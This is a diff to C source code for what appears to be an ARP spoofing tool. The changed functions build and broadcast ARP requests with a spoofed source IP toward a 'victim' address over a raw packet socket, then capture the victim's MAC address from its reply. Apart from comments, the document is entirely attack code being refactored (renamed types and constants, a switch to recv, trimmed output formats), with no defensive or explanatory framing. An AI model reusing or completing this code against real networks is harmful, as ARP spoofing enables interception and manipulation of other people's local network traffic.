@@ -23,7 +23,7 @@
 # define ERROR_DISPLAY_USAGE            fprintf(stderr,"USAGE: %s source_ip target_ip interface\n")
 
 # define PRINT_MAC_ADDRESS(X)   fprintf(stdout, \
-                                        "MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n", \
+                                        "%02X:%02X:%02X:%02X:%02X:%02X\n", \
                                         X[0],               \
                                         X[1],               \
                                         X[2],               \
@@ -31,7 +31,7 @@
                                         X[4],               \
                                         X[5]);
 # define PRINT_IP_ADDRESS(X)    fprintf(stdout, \
-                                        "IP address: %02d.%02d.%02d.%02d\n", \
+                                        "%02d.%02d.%02d.%02d\n", \
                                         X[0],               \
                                         X[1],               \
                                         X[2],               \
@@ -80,26 +80,16 @@ char broadcast_packet(const int sd,
                       const char *spoofed_ip_source,
                       const char *victim_ip)
 {
-    eth_packet* eth_pkt;
-    arp_packet* arp_pkt;
-
-    if (!(arp_pkt = create_arp_packet(ARPOP_REQUEST, my_mac_address,
-                                         spoofed_ip_source, BROADCAST_ADDR,
-                                         victim_ip))) {
-        ERROR_PACKET_CREATION_ARP;
-        return 0;
-    }
-    fprintf(stdout, "[+] ARP packet created\n");
-
-    if (!(eth_pkt =
-              create_eth_packet(my_mac_address, BROADCAST_ADDR,
-                                     arp_pkt))) {
+    eth_header* eth_pkt;
+    if (!(eth_pkt = create_arp_packet(ARPOP_REQUEST, my_mac_address,
+                                      spoofed_ip_source, BROADCAST_ADDR,
+                                      victim_ip))) {
         ERROR_PACKET_CREATION_ETHER;
         return 0;
     }
     fprintf(stdout, "[+] ETHER packet created\n");
 
-    if ((sendto(sd, eth_pkt, ARP_HEADER_LENGTH + ETH_HEADER_LENGTH, 0,
+    if ((sendto(sd, eth_pkt, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                 (const struct sockaddr *)device, sizeof(*device))) <= 0) {
         ERROR_COULD_NOT_SEND;
         return 0;
@@ -112,24 +102,26 @@ char broadcast_packet(const int sd,
 uint8_t *get_victim_mac(const int sd, const char *victim_ip)
 {
     char buffer[IP_MAXPACKET];
-    eth_packet *eth_pkt;
+    eth_header *eth_pkt;
     arp_packet *arp_pkt;
     uint8_t *victim_mac_address;
     char uint8_t_to_str[INET_ADDRSTRLEN] = {0};
 
-    if (!(victim_mac_address = malloc(sizeof(uint8_t) * HARDWARE_LENGTH)))
+    if (!(victim_mac_address = malloc(sizeof(uint8_t) * MACADDR_LEN)))
         return (NULL);
-    fprintf(stdout, "[*] Listening for target response..\n");
+    fprintf(stdout, "[*] Listening for target response...\n");
     while (1)
     {
-        if (recvfrom(sd, buffer, IP_MAXPACKET, 0, NULL, NULL) <= 0)
-            return (NULL);
+        /* NOTE: See `man recv` */
+        // if (recvfrom(sd, buffer, IP_MAXPACKET, 0, NULL, NULL) <= 0)
+        //     return (NULL);
+        if (recv(sd, buffer, IP_MAXPACKET, 0) <= 0) return (NULL);
 
-        eth_pkt = (eth_packet *)buffer;
+        eth_pkt = (eth_header *)buffer;
         if (ntohs(eth_pkt->eth_type) != ETH_P_ARP)
             continue;
 
-        arp_pkt = (arp_packet *)(buffer + ETH_HEADER_LENGTH);
+        arp_pkt = (arp_packet *)(buffer + ETH_HDR_LEN);
 
         if (ntohs(arp_pkt->opcode) != ARPOP_REPLY
             || (arp_pkt->sender_ip &&
@@ -151,7 +143,7 @@ uint8_t *get_victim_mac(const int sd, const char *victim_ip)
         PRINT_IP_ADDRESS(arp_pkt->target_ip);
 
         memcpy(victim_mac_address, arp_pkt->sender_mac,
-               HARDWARE_LENGTH * sizeof(uint8_t));
+               MACADDR_LEN * sizeof(uint8_t));
         fprintf(stdout, "[*] Victim's mac address: ");
         PRINT_MAC_ADDRESS(victim_mac_address);
         return (victim_mac_address);
@@ -198,7 +190,7 @@ int main(int argc, char *argv[])
      * htons() handles byte order of little endian machines. In big endian
      * machines it returns the value it is given.
      *
-     * see `man 7 packet` for explanation for socket domain and socket type.
+     * See `man 7 packet` for explanation for socket domain and socket type.
      *
      */
 
